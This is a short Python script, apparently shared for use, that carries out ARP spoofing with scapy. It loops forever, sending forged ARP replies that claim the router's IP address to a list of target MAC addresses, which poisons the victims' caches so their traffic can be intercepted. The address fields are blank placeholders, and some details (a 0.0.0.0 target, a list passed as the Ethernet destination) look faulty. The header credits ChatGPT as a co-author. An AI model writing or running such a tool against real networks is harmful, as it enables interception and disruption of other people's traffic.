#ARP Spoofing Proxy
#Contributors: James, ChatGPT

sender_mac=""
reciever_mac_list = [
    "",#
]
router_ip=""

from scapy.all import *
import time

while True:
    sendp(Ether(dst=reciever_mac_list,src=sender_mac)/ARP(pdst="0.0.0.0",psrc=router_ip, op=2))
    time.sleep(0.1)
